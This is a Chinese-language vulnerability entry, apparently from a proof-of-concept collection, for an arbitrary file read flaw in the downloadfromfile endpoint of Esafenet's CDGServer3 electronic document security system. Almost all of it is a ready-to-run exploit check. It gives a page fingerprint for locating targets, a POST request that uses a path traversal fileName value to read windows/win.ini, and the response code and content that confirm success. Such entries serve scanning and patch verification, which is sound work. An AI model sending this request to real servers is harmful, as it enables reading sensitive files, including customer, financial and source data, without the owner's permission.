﻿# 亿赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：亿赛通电子文档安全管理系统 多处接口存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。  

> 漏洞特征：body="/CDGServer3/index.jsp"

> 验证脚本：HTTP

```
POST /CDGServer3/downloadfromfile HTTP/1.1
Content-Type: application/x-www-form-urlencoded

fileName=../../../../../../../../../../../windows/win.ini
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：亿赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞.poc

